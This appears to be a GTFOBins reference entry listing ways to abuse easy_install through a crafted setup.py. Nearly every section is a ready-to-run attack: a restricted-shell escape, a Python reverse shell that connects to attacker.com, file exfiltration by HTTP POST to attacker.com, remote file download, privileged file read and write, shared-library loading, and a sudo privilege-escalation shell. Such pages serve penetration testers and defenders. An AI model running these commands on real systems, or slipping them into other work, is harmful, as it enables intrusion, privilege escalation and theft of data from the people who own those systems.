# GTFOBin: easy_install

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
easy_install $TF
```

## Reverse shell

It can send back a reverse shell to a listening attacker to open a remote network access.

Run `socat file:`tty`,raw,echo=0 tcp-listen:12345` on the attacker box to receive the shell.

```
export RHOST=attacker.com
export RPORT=12345
TF=$(mktemp -d)
echo 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")' > $TF/setup.py
easy_install $TF
```

## File upload

It can exfiltrate files on the network.

Send local file via “d” parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.

```
export URL=http://attacker.com/
export LFILE=file_to_send
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))' > $TF/setup.py
easy_install $TF
```

Serve files in the local folder running an HTTP server.

```
export LPORT=8888
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py
easy_install $TF
```

## File download

It can download remote files.

Fetch a remote file via HTTP GET request. The file path must be absolute.

```
export URL=http://attacker.com/file_to_get
export LFILE=/tmp/file_to_save
TF=$(mktemp -d)
echo "import os;
os.execl('$(whereis python)', '$(whereis python)', '-c', \"\"\"import sys;
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve('$URL', '$LFILE')\"\"\")" > $TF/setup.py
pip install $TF
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

The file path must be absolute.

```
export LFILE=/tmp/file_to_save
TF=$(mktemp -d)
echo "import os;
os.execl('$(whereis python)', 'python', '-c', 'open(\"$LFILE\",\"w+\").write(\"DATA\")')" > $TF/setup.py
easy_install $TF
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

The read file content is wrapped within program messages.

```
TF=$(mktemp -d)
echo 'print(open("file_to_read").read())' > $TF/setup.py
easy_install $TF
```

## Library load

It loads shared libraries that may be used to run code in the binary execution context.

```
TF=$(mktemp -d)
echo 'from ctypes import cdll; cdll.LoadLibrary("lib.so")' > $TF/setup.py
easy_install $TF
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo easy_install $TF
```